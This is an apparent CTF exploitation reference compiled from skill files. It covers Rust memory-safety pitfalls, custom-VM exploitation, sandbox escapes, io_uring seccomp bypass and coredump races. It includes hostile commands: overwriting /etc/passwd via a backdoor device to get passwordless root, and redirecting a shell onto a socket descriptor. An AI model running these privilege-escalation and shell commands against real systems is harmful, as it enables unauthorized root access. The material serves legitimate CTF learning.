**Mechanic:** Rust `as` is truncation, not saturation. A common pattern: `let idx = (header.len - 16) as usize;` where `header.len: u32` and `header.len < 16` wraps to a massive u32 → huge `usize` → OOB. Works across platforms but 64-bit hosts give you the largest effective oracle.

## `async` Future State-Machine Confusion

**Trigger:** async function mixes `&mut self` borrow across an `.await` point with raw-pointer aliasing underneath.
**Signals:** `Pin<&mut Self>` projection + `unsafe impl Send`/`Sync` on a generator struct; challenge uses `tokio` or `smol`.
**Mechanic:** the compiler transforms async fn into a hand-woven state machine. A borrow held across `.await` but also captured into a `raw pointer` (via transmute or `ptr::addr_of_mut`) lets an attacker observe the same memory through two different "live" references when the future is resumed. Race with another task → TOCTOU inside the future's state.

## Rustc Symbol Demangling + Type Recovery

Rust symbols are mangled in two formats:
- **Legacy v0 (`_ZN4core...`)**: demangles via `c++filt` or `rustfilt`.
- **v1 (`_R...`)**: rustfilt only, or `llvm-cxxfilt --format=rust`.

`rustc --print sysroot` tells you the toolchain version; match `cargo about` or `cargo-audit` to infer crate versions from embedded strings. `strings` often leaks dependency paths: `~/.cargo/registry/src/index.crates.io-*/serde-1.0.204/…`.

## Reverse Engineering: Closures, Traits, Vtables

Closures compile to anonymous structs implementing `Fn/FnMut/FnOnce` traits. A closure capturing `&mut x` becomes `struct Closure { x: &mut X }` with an auto-derived `call(&mut self)`. Virtual-dispatch `dyn Trait` uses a `(*const data, *const vtable)` fat-pointer pair. Find the vtable: it's a symbol-named `_ZN...VT...` or a literal `[fn; N+3]` constant in `.rodata` where first three slots are `drop`, `size`, `align`.

## Tooling

- **rustfilt**: `cargo install rustfilt`; pipe binary symbols through it.
- **gdb-rust**: `cargo install gdb-rust-pretty-printer` for `Vec`/`HashMap` pretty-printing.
- **cargo-binutils**: `cargo install cargo-binutils` then `cargo objdump -- -d` with rust-aware annotation.
- **lldb** with `type category -e rust` for Rust type recognition.
- **r2 rust plugin**: `r2pm -ci rust` adds rustc-aware disasm.

## Pattern Recognition Index additions (add to ctf-pwn/SKILL.md)

| Signal | Technique → file |
|---|---|
| Rust panic caught + recovered with unsafe state between | Unwind-path `Drop` corruption → rust-pwn.md |
| `mem::transmute` / `slice::from_raw_parts_mut` on user-controlled len | Sliced-length OOB → rust-pwn.md |
| `Vec::reserve(n)` + `set_len(n)` without n writes | Uninitialised-drop vtable hijack → rust-pwn.md |
| `as u32` / `as usize` on subtraction result in release build | Truncation overflow → rust-pwn.md |
| `async fn` with `Pin<&mut Self>` across `.await` + raw-ptr aliasing | Future state-machine confusion → rust-pwn.md |

Reference: Ralf Jung's `unsafe` papers + 2025 RustConf exploit-dev talks.



---

<!-- Source: sandbox-escape.md -->

# CTF Pwn - Sandbox Escape and Restricted Environments

## Table of Contents
- [Python Sandbox Escape](#python-sandbox-escape)
- [VM Exploitation (Custom Bytecode)](#vm-exploitation-custom-bytecode)
- [FUSE/CUSE Character Device Exploitation](#fusecuse-character-device-exploitation)
- [Busybox/Restricted Shell Escalation](#busyboxrestricted-shell-escalation)
- [Shell Tricks](#shell-tricks)

---

## Python Sandbox Escape

Python jail/sandbox escape techniques (AST bypass, audit hook bypass, MRO-based builtin recovery, decorator chains, restricted charset tricks, and more) are covered comprehensively in [ctf-misc/pyjails.md](../ctf-misc/pyjails.md).

## VM Exploitation (Custom Bytecode)

**Pattern (TerViMator, Pragyan 2026):** Custom VM with registers, opcodes, syscalls. Full RELRO + NX + PIE.

**Common vulnerabilities in VM syscalls:**
- **OOB read/write:** `inspect(obj, offset)` and `write_byte(obj, offset, val)` without bounds checking allows read/modify object struct data beyond allocated buffer
- **Struct overflow via name:** `name(obj, length)` writing directly to object struct allows overflowing into adjacent struct fields

**Exploitation pattern:**
1. Allocate two objects (data + exec)
2. Use OOB `inspect` to read exec object's XOR-encoded function pointer to leak PIE base
3. Use `name` overflow to rewrite exec object's pointer with `win() ^ KEY`
4. `execute(obj)` decodes and calls the patched function pointer

## FUSE/CUSE Character Device Exploitation

**FUSE** (Filesystem in Userspace) / **CUSE** (Character device in Userspace)

**Identification:**
- Look for `cuse_lowlevel_main()` or `fuse_main()` calls
- Device operations struct with `open`, `read`, `write` handlers
- Device name registered via `DEVNAME=backdoor` or similar

**Common vulnerability patterns:**
```c
// Backdoor pattern: write handler with command parsing
void backdoor_write(const char *input, size_t len) {
    char *cmd = strtok(input, ":");
    char *file = strtok(NULL, ":");
    char *mode = strtok(NULL, ":");
    if (!strcmp(cmd, "b4ckd00r")) {
        chmod(file, atoi(mode));  // Arbitrary chmod!
    }
}
```

**Exploitation:**
```bash
# Change /etc/passwd permissions via custom device
echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor

# 511 decimal = 0777 octal (rwx for all)
# Now modify passwd to get root
echo "root::0:0:root:/root:/bin/sh" > /etc/passwd
su root
```

**Privilege escalation via passwd modification:**
1. Make `/etc/passwd` writable via the backdoor
2. Replace root line with `root::0:0:root:/root:/bin/sh` (no password)
3. `su root` without password prompt

## Busybox/Restricted Shell Escalation

When in restricted environment without sudo:
1. Find writable paths via character devices
2. Target system files: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
3. Modify permissions then content to gain root

## Shell Tricks

**File descriptor redirection (no reverse shell needed):**
```bash
# Redirect stdin/stdout to client socket (fd 3 common for network)
exec <&3; sh >&3 2>&3

# Or as single command string
exec<&3;sh>&3
```
- Network servers often have client connection on fd 3
- Avoids firewall issues with outbound connections
- Works when you have command exec but limited chars

**Find correct fd:**
```bash
ls -la /proc/self/fd           # List open file descriptors
```

**Short shellcode alternatives:**
- `sh<&3 >&3` - minimal shell redirect
- Use `$0` instead of `sh` in some shells

---

## io_uring Seccomp Escape with `IORING_SETUP_NO_MMAP` (source: pwn.college AoP 2025 Sleigh)

**Trigger:** seccomp filter allowlists `io_uring_{setup,enter,register}` and `exit_group` only; kernel ≥ 6.1.
**Signals:** `prctl(PR_SET_NO_NEW_PRIVS)` followed by bpf filter printed in the challenge; `/proc/self/status` shows Seccomp:2; kernel version >= 6.1.
**Mechanic:** `IORING_SETUP_NO_MMAP` (added in 6.1) lets userspace supply the SQ/CQ ring memory pages directly, removing the need for `mmap` which seccomp blocked. Allocate ring buffers inside pre-mapped regions (stack, BSS), enter io_uring, submit SQEs for `openat("/flag") + read + write(stdout)`. Fully bypasses seccomp-ORW filters that forgot io_uring existed.
Template: see `liburing`'s `test/nomap.c`.

## SCM_RIGHTS FD Smuggling Across Sandbox Boundary (source: pwn.college AoP 2025)

**Trigger:** two cooperating processes where the privileged helper is reachable via AF_UNIX socket, and the sandboxed side denies `open`/`openat`.
**Signals:** `socket(AF_UNIX, SOCK_DGRAM)` or `SOCK_SEQPACKET`, presence of a companion binary launched by the challenge, seccomp filter with CMSG unrestricted.
**Mechanic:** helper opens `/flag` and sends the FD via `sendmsg(...SCM_RIGHTS...)`; sandboxed process reads it with `read(received_fd, buf, n)`. Seccomp that blocks `open*` typically doesn't model FD-passing. Minimal client:
```c
struct msghdr mh = {...}; struct cmsghdr *c = CMSG_FIRSTHDR(&mh);
c->cmsg_level=SOL_SOCKET; c->cmsg_type=SCM_RIGHTS; *(int*)CMSG_DATA(c)=fd;
```

## Coredump Race Before In-Memory Wipe (source: pwn.college AoP 2025 CLAUS)

**Trigger:** setuid binary that `read`s secret into buffer then overwrites with `#` or `\0`; coredumps enabled (`ulimit -c unlimited` or `/proc/sys/kernel/core_pattern` writable).
**Signals:** `setuid` bit, very short window between secret read and scrub, `core_pattern = /tmp/core.%p` or similar attacker-readable location.
**Mechanic:** send SIGQUIT (or other dumping signal) during the tiny window; core contains the unscrubbed secret. Use `signalfd` + tight loop to hit the window; on pwn.college practice mode coredumps land where the solver can read them. Pattern applies to any "scrub after read" flow with signal reachability.

## eBPF FSM Gated by Syscall Sequence (source: pwn.college AoP 2025 day 4)

**Trigger:** eBPF program attached to a kprobe (`linkat`, `openat`, `prctl`); flag release depends on global state flipped by the BPF program; BPF bytecode extractable via `bpftool prog dump xlated`.
**Signals:** `bpftool prog list` shows one non-standard program; `/sys/kernel/debug/tracing/events/*` modified.
**Mechanic:** decompile bytecode → recover finite-state machine; map each transition to the syscall argument hash it checks; craft an exact sequence of calls (e.g. `linkat("/tmp/a","/tmp/b"); linkat("/tmp/c","/tmp/d"); …`) to reach accept state. Automation: feed bytecode to angr symbolic executor with `bpf-ir` lifter, solve for input sequence.
